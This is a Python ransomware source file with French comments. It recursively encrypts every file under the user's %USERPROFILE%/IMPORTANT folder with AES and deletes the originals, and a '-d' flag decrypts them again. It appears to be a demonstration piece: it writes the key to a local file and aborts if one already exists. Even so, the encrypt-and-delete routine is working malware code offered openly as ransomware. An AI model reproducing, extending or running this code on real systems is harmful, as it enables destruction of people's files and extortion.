import os, pyAesCrypt, secrets, sys


def encryptFile(f, key):
    # encryption/decryption buffer size - 64K
    bufferSize = 64 * 1024

    # encrypt
    pyAesCrypt.encryptFile(f, f + ".encrypted", key, bufferSize)

    return f + ".encrypted"

def decryptFile(f, key):
    # encryption/decryption buffer size - 64K
    bufferSize = 64 * 1024

    outfile = f + ".decrypted"
    if f.endswith(".encrypted"):
        outfile = os.path.splitext(f)[0]

    # decrypt
    pyAesCrypt.decryptFile(f, outfile, key, bufferSize)

    return outfile



def listAllFiles(directory):
    allFiles = []

    for fileOrDir in os.listdir(directory):
        fileOrDir = os.path.join(directory,fileOrDir)
        if os.path.isfile(fileOrDir):
            allFiles.append(fileOrDir)
        elif os.path.isdir(fileOrDir):
            filesInSubDir = listAllFiles(fileOrDir)
            for fileInSubDir in filesInSubDir:
                allFiles.append(fileInSubDir)
    
    return allFiles

        
def ransomwareEncrypt(allFiles):
    # On génère une clé
    key = secrets.token_hex(256)

    # On sauvegarde la clé dans un fichier (on est pas des bêtes)
    if os.path.isfile("ransomware_key.txt"):
        print("A key file already exists, aborting")
        exit()
    fw = open("ransomware_key.txt", "x")
    fw.write(key)
    fw.close()
    print("The key has been saved : " + os.path.join(os.path.dirname(__file__), "ransomware_key.txt"))

    # On chiffre tous les fichiers
    for f in allFiles:
        encryptFile(f, key)
        os.remove(f)



def ransomwareDecrypt(allFiles, keyFile):
    # On vérifie si le fichier clé existe
    if not os.path.isfile(keyFile):
        print("The key file does not exists, aborting")
        exit()

    # On lit la clé
    f = open(keyFile, "r")
    key = f.read()
    f.close()
    
    # On déchiffre tous les fichiers
    for f in allFiles:
        print("Decrypting " + f)
        print("     " + decryptFile(f, key))
        os.remove(f)





def main(argv):
    keyFile = None
    if len(argv) == 1:
        pass
    elif len(argv) == 3 and argv[1] == "-d":
        keyFile = argv[2]
    else:
        print("Usage: ")
        print("    Encryption: '" + argv[0] + "'")
        print("    Decryption: '" + argv[0] + " -d <keyfile>'")
        exit()

    # Le dossier de base est le dossier "%USERPROFILE%/IMPORTANT"
    importantFolder = os.path.join(os.environ["USERPROFILE"], "IMPORTANT")
    # S'il n'existe pas on quitte
    if not os.path.exists(importantFolder):
        print("The target folder does not exists, aborting")
        exit()
    
    # On récupère la liste des fichiers
    allFiles = listAllFiles(importantFolder)

    if keyFile == None:
        ransomwareEncrypt(allFiles)
    else:
        ransomwareDecrypt(allFiles, keyFile)



if __name__== "__main__":
    main(sys.argv)